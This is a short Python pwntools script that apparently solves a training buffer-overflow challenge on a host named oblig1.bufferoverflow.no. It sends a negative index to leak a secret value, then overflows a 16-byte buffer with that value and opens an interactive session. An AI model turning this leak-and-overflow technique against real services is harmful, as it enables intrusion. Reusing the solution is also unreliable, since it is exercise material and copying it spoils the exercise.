import pwn

target = 'oblig1.bufferoverflow.no'
port = '7004'

bufferfill = b'A' * 16
expose_secret = '-48'

p = pwn.remote(target, port)
print(b'1: ' + p.recvline())
print(b'2: ' + p.recvline())

p.send(expose_secret + '\n')

print(b'3: ' + p.recvline())

read_secret = p.recvline()
print(b'Read secret: ' + read_secret)

secret_val = pwn.p64(int(read_secret, 16))
print(b'Secret_val: ' + secret_val)

print(b'4: ' + p.recvline())

p.send(bufferfill + secret_val + b'\n')

print(p.recvline())

p.interactive()

p.close()